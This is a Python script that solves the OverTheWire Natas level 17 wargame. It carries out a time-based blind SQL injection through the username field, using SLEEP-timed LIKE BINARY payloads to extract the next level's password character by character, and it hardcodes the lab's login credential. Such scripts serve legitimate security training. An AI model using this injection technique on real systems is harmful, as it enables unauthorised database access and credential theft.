#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string
from time import time, sleep

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits

username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

seen_password = ''
while len(seen_password) < 32:
    character_found = False

    for character in characters:
        start_time = time()


        print("trying ", ''.join(seen_password + character))
        payload = 'natas18" AND password LIKE BINARY "' + seen_password + character + '%" AND SLEEP(2) #'
        data = {'username': payload}
        
        response = session.post(url, data=data, auth=(username, password))
        end_time = time()

        difference = end_time - start_time

        if difference > 2:  # Adjust the threshold as needed
            seen_password += character
            character_found = True
            #seen_password.append(character)
            break

    if not character_found:
        print("Character not found. Exiting.")
        break

print('The password is:', seen_password)
